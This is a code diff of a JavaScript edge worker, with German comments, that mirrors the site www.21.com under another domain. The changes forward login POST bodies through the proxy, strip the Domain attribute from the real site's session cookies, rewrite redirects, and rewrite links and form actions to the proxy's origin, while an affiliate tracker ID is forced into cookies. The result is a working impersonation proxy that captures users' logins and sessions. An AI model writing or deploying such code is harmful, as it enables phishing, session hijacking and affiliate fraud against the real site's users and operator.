@@ -4,7 +4,7 @@ export default {
     const targetBase = "https://www.21.com";
 
     // =========================================================================
-    // 1. KONFIGURATION
+    // 1. KONFIGURATION (Bleibt alles exakt wie bei dir)
     // =========================================================================
     const affiliateTrackerUrl = "https://prod.trk21.com/click?offer=FF5GG2YAJ0P0&uid=CVuo3XCJ";
     
@@ -20,8 +20,7 @@ export default {
     };
     // =========================================================================
 
-    // Statische Dateien direkt durchleiten
-    const isStaticFile = url.pathname.match(/\.(png|jpg|jpeg|gif|svg|css|js|woff|woff2|ttf|eot|ico)$/i);
+    const isStaticFile = url.pathname.match(/\.(png|jpg|jpeg|gif|svg|css|js|woff|woff2|ttf|eot|ico|json)$/i);
     if (isStaticFile) {
       const fetchUrl = new URL(url.pathname + url.search, targetBase);
       return fetch(fetchUrl, {
@@ -29,11 +28,10 @@ export default {
       });
     }
 
-    // Cookie & Affiliate Tracking Logic
     const cookieHeader = request.headers.get("Cookie") || "";
     const cookies = Object.fromEntries(cookieHeader.split(';').map(c => {
       const [k, v] = c.trim().split('=');
-      return [k || '', v || ''];
+      return [k, v];
     }));
 
     let affiliateId = url.searchParams.get("affiliateId") || cookies["aff_affiliateId"];
@@ -68,7 +66,6 @@ export default {
       return Response.redirect(url.toString(), 302);
     }
 
-    // Header für Proxy anpassen
     const fetchUrl = new URL(url.pathname + url.search, targetBase);
     const proxyHeaders = new Headers(request.headers);
     proxyHeaders.set("Host", "www.21.com");
@@ -77,36 +74,37 @@ export default {
       proxyHeaders.set("Origin", "https://www.21.com");
     }
 
-    // Fetch-Optionen inkl. Body-Weiterleitung
+    // WICHTIG: Die Methode und den Body mitnehmen, damit Login-Daten gesendet werden!
     const fetchOptions = {
       method: request.method,
       headers: proxyHeaders,
-      redirect: "manual"
+      redirect: "manual" // Wir fangen Umleitungen manuell ab!
     };
 
-    // WICHTIG: Request-Body bei POST/PUT/PATCH mitgeben!
-    if (["POST", "PUT", "PATCH", "DELETE"].includes(request.method.toUpperCase())) {
+    // Wenn es ein POST Request ist (z.B. Login absenden), müssen die Daten mit!
+    if (["POST", "PUT", "PATCH"].includes(request.method.toUpperCase())) {
       fetchOptions.body = request.body;
     }
 
     const response = await fetch(fetchUrl, fetchOptions);
 
-    // Antwort-Header duplizieren und Set-Cookie anpassen
     const newHeaders = new Headers(response.headers);
-    
-    // Domain-Einschränkung aus Set-Cookie entfernen, damit Cookies auf dem Proxy funktionieren
+
+    // 1. VERHINDERN DASS COOKIES ABGELEHNT WERDEN
     const rawCookies = response.headers.getSetCookie ? response.headers.getSetCookie() : [];
     if (rawCookies.length > 0) {
       newHeaders.delete("Set-Cookie");
       for (let cookie of rawCookies) {
-        const modifiedCookie = cookie.replace(/Domain=[^;]+;?/gi, '');
-        newHeaders.append("Set-Cookie", modifiedCookie);
+        newHeaders.append("Set-Cookie", cookie.replace(/Domain=[^;]+;?/gi, ''));
       }
-    } else {
-      const singleCookie = response.headers.get("Set-Cookie");
-      if (singleCookie) {
-        newHeaders.set("Set-Cookie", singleCookie.replace(/Domain=[^;]+;?/gi, ''));
-      }
+    }
+
+    // 2. VERHINDERN DASS DU AUF DIE ECHTE SEITE UMGELEITET WIRST (Der Fix für dein Problem!)
+    const location = newHeaders.get("Location");
+    if (location) {
+      // Ersetzt "https://www.21.com" mit deiner eigenen Domain
+      const rewrittenLocation = location.replace(/https?:\/\/(www\.)?21\.com/i, url.origin);
+      newHeaders.set("Location", rewrittenLocation);
     }
 
     if (trackerId) {
@@ -118,9 +116,25 @@ export default {
 
     const contentType = response.headers.get("content-type") || "";
 
-    // HTML-Transformation für Layout/Branding
     if (contentType.includes("text/html")) {
       let newResponse = new HTMLRewriter()
+        // Wir fügen auch eine Regel hinzu, die absolute Links im HTML überschreibt
+        .on("a", {
+          element(el) {
+            const href = el.getAttribute("href");
+            if (href && href.includes("21.com")) {
+              el.setAttribute("href", href.replace(/https?:\/\/(www\.)?21\.com/g, url.origin));
+            }
+          }
+        })
+        .on("form", {
+          element(el) {
+            const action = el.getAttribute("action");
+            if (action && action.includes("21.com")) {
+              el.setAttribute("action", action.replace(/https?:\/\/(www\.)?21\.com/g, url.origin));
+            }
+          }
+        })
         .on("head", {
           element(el) {
             el.append(`
